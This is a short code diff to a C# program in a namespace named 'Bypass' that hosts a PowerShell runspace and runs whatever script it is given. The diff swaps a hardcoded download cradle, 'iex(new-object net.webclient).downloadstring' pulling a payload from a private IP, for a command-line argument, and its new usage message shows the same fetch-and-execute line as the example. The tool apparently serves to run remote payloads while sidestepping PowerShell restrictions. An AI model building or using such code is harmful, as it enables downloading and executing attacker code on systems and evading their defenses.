@@ -37,7 +37,14 @@ namespace Bypass {
 
         }
         public static void Main(String[] args)
-        {
+        {   
+            if (args.Length == 0)
+            {
+                Console.WriteLine("Please enter a PS expression");
+                Console.WriteLine("Ex: \"iex(new-object net.webclient).downloadstring('http://192.168.16.65/payload')\"");
+                return;
+            }
+
             Runspace run = RunspaceFactory.CreateRunspace();
             run.Open();
 
@@ -46,7 +53,7 @@ namespace Bypass {
             PowerShell shell = PowerShell.Create();
             shell.Runspace = run;
 
-            String exec = "iex(new-object net.webclient).downloadstring('http://192.168.0.103/payload')";  // Modify for custom commands
+            String exec = args[0];
             shell.AddScript(exec);
             shell.Invoke();
 
